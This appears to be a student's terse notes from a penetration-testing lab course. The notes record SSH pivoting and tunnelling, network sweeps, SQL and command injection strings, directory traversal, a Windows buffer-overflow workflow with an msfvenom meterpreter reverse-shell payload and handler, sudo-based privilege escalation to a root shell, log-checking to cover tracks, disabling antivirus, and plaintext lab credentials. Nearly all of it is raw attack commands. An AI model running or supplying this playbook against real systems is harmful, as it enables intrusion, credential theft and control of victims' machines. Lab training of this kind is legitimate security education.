KEPE-006-M
jTlU99dknad4D95

Tunnels
exit
ssh -MS /tmp/gray student@10.50.46.234
ssh -S /tmp/gray gray -O forward -D9050
ssh -S /tmp/gray 10 -O forward -L 1700:192.168.28.27:22

for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.129,112,113,114 
-p-[all ports] -p[22,23]


SQL Injection
admin' or 1='1
SELECT carid, name, (SELECT SUM(cost) FROM Tires WHERE name = "goodyear") FROM car WHERE name = "ford";
<URL>/uniondemo.php?Selection=2 OR 1=1
<URL>/uniondemo.php?Selection=2 Union SELECT 1,2,3  <!-- Validate NUMBER of columns required -->
<URL>/uniondemo.php?Selection=2 Union SELECT 1,name,3 FROM Tires <!-- Test pulling VALID data -->
<URL>/uniondemo.php?Selection=2 Union SELECT 1,name,3 FROM car <!-- Test pulling data from ALTERNATE table -->

ssh www-data@0.0.0.0 -p 1460 -L 1400:192.168.150.253:3201 -NT



Windows Buffer Overflow
Break program with tcpcon.py

Open Immunity debuger CPU window and exe as administrator
Attach file in cpu window
Generate Buffer overflow pattern https://wiremask.eu/tools/buffer-overflow-pattern-generator/
Copy EIP to find where the error happens
add DEADCODE to buff in script
mona modules -o
imona jmp -r esp -m "<file>"
find jmp esp instruction memory address
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.46.234 lport=4444 -b
msfconsole -q
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
show options, set lhost, set lport
shut off real time protection in windows-> security -> vires and threat -> mange settings -> real-time protection





Privilege Escalation,P Persistence and Covering your Tracks
sudo -l (list user permissions)
/var/log/ auth.log/secure (login/authen) lastlog(successful login time) btmp(bad login) sulog(SU command) utmp(W command) wtmp(permanent record on user)

find /var/log -type f -mmin -10 2> /dev/null

msfvenom -p linux/x86/exec CMD="sudo cat /.secret/.verysecret.pdb" -b '\x00' -f python




Windows Exploitation
Services
check path
file explorer

msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\UNAME\Desktop\whoami.txt' -f exe > 7z.exe
scp
task scheduler
find task run by system try and try and edit/create files within the directory
view hidden files

msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\UNAME\Desktio\dll.dll' -f dll > name of dll its calling for

ssh -S /tmp/gray pivot -O forward -L 1700:192.168.28.105:2222
ssh comrade@0.0.0.0 -p 1700 -L 40000:192.168.28.27:22
ssh zeus@0.0.0.0 -p 40000 -L 1900:192.168.28.9:3389
ghjcnbnenrf
xfreerdp /u:comrade /v:0.0.0.0:1900 /p:StudentMidwayPassword /size:1920x1000 +clipboard




Pre-Test

5 boxes
ignore .190 and 10.10
Lin-Ops -> 10.50.46.125
2 Root/Admin 

1)10.50.46.125 port 22,80
nmap -v -sT -Pn -T4 -sV 10.50.46.125
nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 10.50.46.125 -p 80

cmd injection ;whoami
SQL injection admin' or 1='1
Directory Traversal ../../../../../etc/passwd, /etc/hosts, 

user2 [1] => RntyrfVfNER78 [pass] - EaglesIsARE78
 user3 [1] => Obo4GURRnccyrf [pass] -  Bob4THEEapples
Lee_Roth [1] => anotherpassword4THEages

cat /etc/hosts
ip n
arp -a

ssh -MS /tmp/gray user2@10.50.46.125

sudo -l
find perm command
crontab

for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
192.168.28.172,181

ssh -s /tmp/gray/gray -O forward -D9050

proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.172,181

192.168.28.172 22
192.168.28.181 WebApp 22,80

ssh -S /tmp/gray gray -O forward -L 1200:192.168.28.181:80
nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 192.168.28.181 -p 80

http://0.0.0.0:1200/pick.php?product=7%20OR%201=1
http://0.0.0.0:1200/pick.php?product=7%20UNION%20select%201,2,3;
http://0.0.0.0:1200/pick.php?product=7%20UNION%20select%201,3,2;
                   1             2           3
UNION SELECT table_schema, column_name, table_name from infomation_schema.columns;

http://0.0.0.0:1200/pick.php?product=7 20UNION 20SELECT 20name,user_id,username 20FROM 20siteusers.users
<table_schema>,<column_name>,<table_name> from siteusers.<table>

Aaron ncnffjbeqlCn$$jbeq - apasswordyPa$$word
Lroth anotherpassword4THEages

ssh -S /tmp/gray gray -O forward -L 1331:192.168.172:22
ssh -S /tmp/gray gray -O forward -L 1332:192.168.181:22

Brute force with credentials on both known targets

ssh -MS /tmp/aaron Aaron@0.0.0.0 -p 1331
bash
sudo -l
/usr/bin/find https://gtfobins.github.io/

escalate privs 
sudo find . -exec /bin/sh \; -quit
ssh -S /tmp/gray gray -0 cancel -D9050
ssh -S /tmp/aaron Aaron -O forward -D9050

192.168.28.179:22,139,445, 3389(xfreerdp,rdp), 9999 
proxychains nc 192.168.29.179 9999

ssh -S /tmp /aaron aaron -O forward -L 1440:192.168.28.29:3389
ssh -S /tmp /aaron aaron -O forward -L 1441:192.168.28.29:9999
anotherpassword4THEages
xfreerdp /v:192.168.28.179:1440 /u:Lroth /p:anotherpassword4THEages /size:1920x1000 +clipboard
vim secureserverBuffo.py change port to 1440

